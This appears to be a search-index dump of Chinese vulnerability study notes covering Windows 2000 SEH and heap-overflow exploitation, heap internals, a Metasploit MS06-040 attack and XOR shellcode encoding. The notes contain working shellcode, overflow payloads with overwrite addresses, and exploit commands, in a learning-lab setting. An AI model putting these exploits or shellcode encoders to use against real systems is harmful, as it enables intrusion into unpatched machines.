3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot; // Next SEH Record&quot;\\x98\\xFE\\x12\\x00&quot;; // SEH HandlerDWORD MyExceptionhandler(void){ printf(&quot;got an exception, press Enter to kill process!\\n&quot;); getchar(); ExitProcess(1); return 0;}void test(char * input){ char buf[200]; int zero=0; _try { strcpy(buf,input); //overrun the stack zero=4/zero; //generate an exception } _except(MyExceptionhandler()){}}void main(){ test(shellcode);}观察 弹出MessageBox对话框成功SEH的堆利用测试实际测试代码#include &amp;lt;windows.h&amp;gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot; // head of the ajacent free block&quot;\\x88\\x06\\x30\\x00&quot; // 0x00300688 is the address of shellcode in first// Heapblock&quot;\\x30\\xFF\\x12\\x00&quot;; // target of DWORD SHOOTDWORD MyExceptionhandler(void){ ExitProcess(1); return 0;}void main(){ HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); memcpy(h1, shellcode, 0x200); // over flow here, noticed 0x200 means //512 ! __asm int 3 // uesd to break the process __try { h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); } __except(MyExceptionhandler()){}}" }, { "title": "漏洞学习笔记-007-堆溢出的利用", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-007-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-22 16:56:00 +0800", "snippet": "堆溢出的利用声明：实验环境为 Windows 2000本文来源：Moeomu的博客链表的拆卸理论 堆块分配：将堆块从空表中“卸下” 堆块释放：把堆块链入空表 堆块合并：把若干个堆块从空表中“卸下”，修改块首信息(大小)，之后把更新后的新块“链入”空表 利用堆溢出：构造数据溢出下一个堆块的块首，改写块首中的前向指针和后向指针，然后在分配释放合并等操作发生时伺机获得依次向内存任意地址写入任意数据的机会 这种向任意位置写入任意数据的机会称为DWORD SHOOT/ARBITARY DWORD RESET 目标 载荷 改写后的结果 栈帧中的函数返回地址 shellcode起始地址 函数返回时，执行shellcode 栈帧中的S.E.H句柄 shellcode起始地址 异常发生时，执行shellcode 重要函数调用地址 shellcode起始地址 函数调用时，执行shellcode 实践代码#include &amp;lt;windows.h&amp;gt;int main(){ HLOCAL h1, h2,h3,h4,h5,h6; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); _asm int 3//used to break the process //free the odd blocks to prevent coalesing HeapFree(hp,0,h1); HeapFree(hp,0,h3); HeapFree(hp,0,h5); //now freelist[2] got 3 entries //will allocate from freelist[2] which means unlink the last entry //(h5) h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); return 0;}发现 在h1申请到h5空间的时候，如果此时h5已经被溢出覆盖Blink和Flink，那么将会把[Flink]写入[Blink]代码植入原理 目标对准ExitProcess调用的PEB同步函数指针RtlEnterCriticalSection，在程序内堆溢出引发异常后执行shellcode代码示例1(观察异常)#include &amp;lt;windows.h&amp;gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;&quot;\\x88\\x06\\x36\\x00&quot; // ShellCode起始地址&quot;\\x20\\xF0\\xFD\\x7F&quot;; // PEB同步函数指针位置int main(){ HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0;}心得 就差ShellCode内容了代码示例2(不完整)#include &amp;lt;windows.h&amp;gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;// 200 字节堆区结束，以下是溢出数据&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot; // 下一个堆块的块首，保留&quot;\\x88\\x06\\x36\\x00&quot; // ShellCode起始地址&quot;\\x20\\xF0\\xFD\\x7F&quot;; // PEB同步函数指针位置int main(){ HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0;}总结 此次写入了shellcode的部分重要参数，但是主体内容还未写入代码示例3(有问题)#include &amp;lt;windows.h&amp;gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;// Do Something...&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;// 200 字节堆区结束，以下是溢出数据&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot; // 下一个堆块的块首，保留&quot;\\x88\\x06\\x36\\x00&quot; // ShellCode起始地址&quot;\\x20\\xF0\\xFD\\x7F&quot;; // PEB同步函数指针位置int main(){ HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); // __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0;}总结 这就是完整的ShellCode了，可以顺利利用Win2000的堆溢出 但是问题在于无法成功弹出MessageBox 原因是PEB指针连着ShellCode一起欺骗了，需要修复PEB指针代码示例4(完整)#include &amp;lt;windows.h&amp;gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;//repaire the pointer which shooted by heap over run&quot;\\xB8\\x20\\xF0\\xFD\\x7F&quot; //MOV EAX,7FFDF020&quot;\\xBB\\x4C\\xAA\\xF8\\x77&quot; //MOV EBX,77F8AA4C the address may releated to//your OS&quot;\\x89\\x18&quot;//MOV DWORD PTR DS:[EAX],EBX&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;// 200 字节堆区结束，以下是溢出数据&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot; // 下一个堆块的块首，保留&quot;\\x88\\x06\\x36\\x00&quot; // ShellCode起始地址&quot;\\x20\\xF0\\xFD\\x7F&quot;; // PEB同步函数指针位置int main(){ HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); // __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0;}总结 这就是完整的ShellCode了，可以顺利利用Win2000的堆溢出弹出MessageBox了" }, { "title": "漏洞学习笔记-006-堆的入门", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-006-%E5%A0%86%E7%9A%84%E5%85%A5%E9%97%A8/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-20 23:10:00 +0800", "snippet": "Windows的堆，从来都是一个乱糟糟的地方，管理方法也非常奇怪声明：实验环境为 Windows 2000本文来源：Moeomu的博客堆的介绍与栈的区别 堆是由程序员使用malloc等函数向操作系统申请的一块内存空间，它能否成功与操作系统的状态有极大的关系，与管理整齐的栈不同，它的管理以及分配算法都是非常奇特的 堆在释放时由程序员使用free或delete释放，而栈是系统自动释放的 堆的地址范围变化很大，而栈的内存地址总是0x0012XXXX 堆的地址由低向高移动，栈的地址由高向低移动堆的安全 堆是杂乱无章的，所以它的利用相对于栈会困难很多，而堆的管理微软从未公开，研究有一定困难 在Windows2000 - Windows XP SP1，堆管理未考虑安全因素，容易利用 在Windows XP SP2 - Windows 2003，加入了块首的cookie，指针验证等 Windows Vista - Windows 7，堆管理的安全，稳定和效率都改变巨大堆的数据结构和管理策略两种堆结构 堆块：堆区的内存按不同大小组织成块，以堆块为单位进行标识。 块首：本块的大小，是否占用 块身：数据区 堆表：位于堆区的起始位置，可索引堆区的所有重要信息，包括堆块的大小，位置，是否占用。堆表往往用不止一种数据结构来表示。 Windows中，占用态的堆块只有占用它的程序索引，堆表只索引空闲态的堆块。 Windows中重要的堆表： 空闲双向链表：(Freelist)(空表) 空表包含128个数组，第二个数组freelist[1]标识8字节的空堆空间，之后每项逐个递增8字节 空闲堆块大小(包含堆首) = 索引项 * 8(字节) freelist[0]标识了所有大小大于1024字节的堆块(小于等于512KB)，它们按从小到大的顺序依次升序排列 快速单向链表(Lookaside)(快表) 快表包含128条数据，组织结构与空表类似，但是单链表 总被初始化为空，每条快表最多4个节点 每个节点都被初始化为已占用，所以不会发生堆块合并现象 管理策略 堆块分配 零号空表分配：按照大小升序链着大小不同的空闲块，从free[0]反向查找最后一个块，再正向搜索最小能够满足要求的空闲堆块进行分配 普通空表分配：寻找最优空闲空间分配，其次找次优 快表分配：寻找大小匹配的表，从堆表卸下，返回一个指向堆块的指针给程序 当空表无法找到最优堆块时，一个稍大些的块会被用于分配，此为次优分配，会先从大块中按照请求的大小精确地割出一块进行分配，然后给剩下的部分重新标注块首，连入空表。 快表只有精确匹配时才会分配，所以不存在以上现象 堆块释放 将堆块状态改为空闲，链入相应的堆表。所有释放的块将链入堆表的末尾，分配的时候也先从堆表末尾拿。 堆块合并 反复申请和释放堆区将产生很多内存碎片，为了合理有效地利用内存将合并一些堆块 这个操作包含两个块从空闲链表中卸下，合并堆块，调整合并后的大块的块首信息，将新块重新链入空闲链表 堆区还将进行内存紧缩(shrink the compact)由RtlCompactHeap执行，将对整个堆进行调整，尽量合并可用的碎片 堆块分配和释放的策略 小块(SIZE&amp;lt;1KB) 分配 首先进行快表分配，机械能普通空表分配 若失败，使用堆缓存(heap cache)分配 若堆缓存分配失败，内存紧缩后尝试分配 若无法分配，返回NULL 释放 优先链入快表(只能链入4个空闲块) 若快表满，链入相应空表 大块(1KB&amp;lt;=SIZE&amp;lt;512KB) 分配 使用堆缓存分配 若堆缓存分配失败，使用free[0]中的大块进行分配 释放 优先将它放入堆缓存 若堆缓存满，将链入freelists[0] 巨块(SIZE&amp;gt;=512KB) 分配：虚分配(并非从堆区分配) 释放：直接释放，无堆表操作 实践 血的教训：无论是空表还是快表，它Blink/Flink指针指向的永远是下/上一个节点的Blink/Flink测试空表代码#include &amp;lt;windows.h&amp;gt;void main(){ HLOCAL h1, h2, h3, h4, h5, h6; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); __asm int 3; h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 6); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 19); h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); //free block and prevent coaleses HeapFree(hp, 0, h1); // free to freelist[2] HeapFree(hp, 0, h3); // free to freelist[2] HeapFree(hp, 0, h5); // free to freelist[4] HeapFree(hp, 0, h4); // coalese h3 h4 h5 link the large block to freelist[8]}观察INT异常调起调试器，未运行 HeadCreate()创建堆区后，将堆区指针交给EAX，观察到此时地址为0x360000 查看内存区域0x360000，依次向后的信息是(抄的，反正我也不知道这几个结构具体多大)段表索引(SegmentList)，虚表索引(VirtualAllocationList)，空表使用标识(freelist usage bitmap)和空表索引区 在偏移0x178处找到了空表索引，其内容是0x00360688，说明freelist[0]指向了偏移为0x688的地方，我们来康康这个地方存了什么 这个地方存了0x00360178，妙啊，指向了freelist[0]，绕了一圈指向了自己，而这个freelist[0]看来指向的就是唯一一个空闲的堆区，一般称为“尾块” 根据堆块的结构(在下面嘞)易得，实际这个堆块开始于0x00360680，看起来堆块指针越过了堆块块首，直接指向了数据区 0x1-0x2字节是自身大小，此时这个值是0x0130，说明这个堆的大小是0x130个字节 0x3-0x4字节是前一个堆块大小，这个值是0x08(???不是说好了唯一???) 0x5字节是索引，此时为0 0x6字节是Flag，此时这是1 0x7是保留字节，是0 0x8字节是标签索引(调试态)，不知道干啥的，是0 0x9-0xC(空堆块专属)字节是前一个空堆块的地址，是0x00360178 0xD-0x10(空堆块专属)字节是后一个空堆块的地址，同样是0x00360178运行六次分配 0x00360680-0x00360688为h1块首，0x00360689-0x0036068F是8个字节的块身，内容是00 00 00 00 78 01 36 00 0x00360690-0x00360698为h2块首，0x00360699-0x0036069F是8个字节的块身，内容是00 00 00 00 00 01 36 00 0x003606A0-0x003606A8为h3块首，0x003606A9-0x003606AF是8个字节的块身，内容是00 00 00 00 00 00 36 00 0x003606B0-0x003606B8为h4块首，0x003606B9-0x003606BF是8个字节的块身，内容是00 00 00 00 00 00 00 00 0x003606C0-0x003606C8为h5块首，0x003606C9-0x003606DF是24个字节的块身，内容是00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x003606E0-0x003606E8为h5块首，0x003606E9-0x003606FF是24个字节的块身，内容是00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00释放堆 第一次释放的堆块大小为16字节的堆块，所以连接到了freeList[2]，也就是0x188的位置，此时内容为0x00360688 第二次释放的堆同样连接到了freeList[2]，细节不再描述 第三次释放的堆同样连接到了freeList[2]，细节不再描述 第四次释放时，h3，h4，h5相邻，所以它们合并了，其中h3h4的大小各是2个堆单位，h5则是4个，那么它们合并后共计8个堆单位，除去要存放一个堆首，它们还剩7个堆单位，所以放入freeList[8]结论 堆表中包含的信息依次是段表索引(SegmentList)，虚表索引(VirtualAllocationList)，空表使用标识(freelist usage bitmap)和空表索引区 当一个堆刚刚被初始化时，它的堆块状况 只有一个空闲态的大块，这个块被称为“尾块” 之后是快表 Freelist[0]指向“尾块” 除了零号空表索引外，区域各项索引都指向自己，这意味着其余所有的空闲链表中都没有空闲块 占用态块首struct Flag{ BIT Busy; BIT ExtraPresent; BIT FillPattern; BIT VirtualAlloc; BIT LastEntry; BIT FFU1; BIT FFU2; BIT NoCoalesce;}struct BusyHeapHeadBlock// 8 Byte Head{ USHORT SelfSize; USHORT PreviousChunkSize; UCHAR SegmentIndex; struct Flag Flags; UCAHR UnusedBytes; UCAHR TagIndex_Debug;}// Data After... 空闲态块首struct Flag{ BIT Busy; BIT ExtraPresent; BIT FillPattern; BIT VirtualAlloc; BIT LastEntry; BIT FFU1; BIT FFU2; BIT NoCoalesce;}struct BusyHeapHeadBlock// 16 Byte Head{ USHORT SelfSize; USHORT PreviousChunkSize; UCHAR SegmentIndex; struct Flag Flags; UCAHR UnusedBytes; UCAHR TagIndex_Debug; PVOID FlinkInFreelist; // 下一个 PVOID BlinkInFreelist; // 上一个}// Empty Data After... 堆块的分配 堆块的大小包括了块首，所以申请32字节将会分配40字节 堆块的单位是8字节，不足8字节的按照8字节分配，所以最少实际分配为16字节 初始状态下，快表和空表都为空，不存在精确分配，请求将使用次优块进行分配 由于次优分配的发生，分配函数将从尾块中切走一些小块，修改尾块块首的size，最后将freelist[0]指向新的尾块 测试快表代码#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;windows.h&amp;gt;void main(){ HLOCAL h1, h2, h3, h4; HANDLE hp; hp = HeapCreate(0, 0, 0); __asm int 3 h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); HeapFree(hp, 0, h1); HeapFree(hp, 0, h2); HeapFree(hp, 0, h3); HeapFree(hp, 0, h4); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); HeapFree(hp, 0, h2);}结论 块首标识位为0x01 只存指向下一堆块的指针，不存在指向前一堆块的指针 偏移0x178处的freeList[0]的地址变为了0x00361E90，原本的0x00360688被快表霸占了 快表从0x688开始，每个结构共0x30个字节，前四个字节的内容是快表单链表 虽然0Day安全书中写道，8字节的堆区被插入lookaside[1]，但是我似乎觉得，0x688处的才是lookaside[0]，0x6B8处的才是lookaside[1]，而0x0E8处的可以被称为lookaside[2]，它存放的堆块带上块首的大小一共16个字节" }, { "title": "漏洞学习笔记-005-Metasploit制作ShellCode", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-005-Metasploit%E5%88%B6%E4%BD%9CShellCode/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-20 22:20:00 +0800", "snippet": "Metasploit制作ShellCode本文来源：Moeomu的博客…未完待续(Metasploit旧版本真难找)…入侵Windows实验实验介绍 MS06-040，CVE-2006-3439   推荐的环境 备注 攻击机系统 Kali Linux 2021.1   目标主机系统 Windows 2000 SP4   补丁版本 KB921883 确保目标主机未安装补丁 网络环境 可互相ping通 确保无防火墙干扰 命令行界面漏洞测试 use exploit/windows/smb/ms06_040_netapi set rhosts 10.211.55.5 exploit使用MetaSploit制作ShellCode…未完待续…" }, { "title": "漏洞学习笔记-004-ShellCode编码", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-004-ShellCode%E7%BC%96%E7%A0%81/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-20 09:20:00 +0800", "snippet": "ShellCode编码和减少体积 点击此处下载本文附可执行程序，shellcode文件本文来源：Moeomu的博客异或编码注意事项 在选取编码字节时，不可与已有字节相同，否则会出现0 可以使用多个不同编码字节对不同区域编码，但会增加复杂度 可以对shellcode进行多轮编码实现代码(ExpStd0401)void encoder(char* input, unsigned char key, int display_flag){ int i = 0, len = 0; FILE* fp; unsigned char * output; len = strlen(input); output = (unsigned char*)malloc(len + 1); if(!output) { printf(&quot;memory error!\\n&quot;); exit(0); } // encode shellcode for(i = 0; i &amp;lt; len; i++) { output[i] = input[i] ^ key; } if(!(fp=fopen(&quot;encode.txt&quot;, &quot;w+&quot;))) { printf(&quot;output file create error!&quot;); exit(0); } fprintf(fp, &quot;\\&quot;&quot;); for(i = 0; i&amp;lt; len; i++) { fprintf(fp, &quot;\\\\x%0.2x&quot;, output[i]); if((i + 1 % 16 == 0)) { fprintf(fp, &quot;\\&quot;\\n\\&quot;&quot;); } } fprintf(fp, &quot;\\&quot;;&quot;); fclose(fp); printf(&quot;dump the encoded shellcode to encode.txt OK!\\n&quot;); if(display_flag) { for(i = 0; i &amp;lt; len; i++) { printf(&quot;%0.2x &quot;, output[i]); if((i + 1) % 16 == 0) { printf(&quot;\\n&quot;); } } } free(output);}解码代码(ExpStd0402) 解码器与shellcode联合执行 默认EAX在shellcode开始时对准shellcode起始位置 shellcode最后一个字节为0x90void main(){ __asm { add eax, 0x14 ;越过decoder记录shellcode起始地址 xor ecx, ecx decode_loop: mov bl, [eax + ecx] xor bl, 0x44 ;用0x44作为key mov [eax + ecx], bl inc ecx cmp bl, 0x90 ;末尾放一个0x90作为结束符 jne decode_loop }}ShellCode减少体积方法 挑选短指令 xchg eax, reg ;交换eax和其它寄存器的值 lodsb ;esi指向的一个dword装入eax，并且增加esi lodsd ;把esi指向的一个byte装入al，并增加esi stosd ;将eax的内容复制到edi的内存地址中，每复制四个字节，edi就加0x4，ecx为大小 stosb ;将eax的内容复制到edi的内存地址中，每复制一个字节，edi就加0x4，ecx为大小 pushad/popad ;从栈中存储/恢复所有寄存器的值 cdq ;用edx把eax扩展成四字，在eax&amp;lt;0x80000000时可用作mov edx, 0 复合指令，合并使用指令 API参数压栈前将栈空间一片区域置为0，压栈时只要压入非0参数即可 代码当数据用，数据当代码用 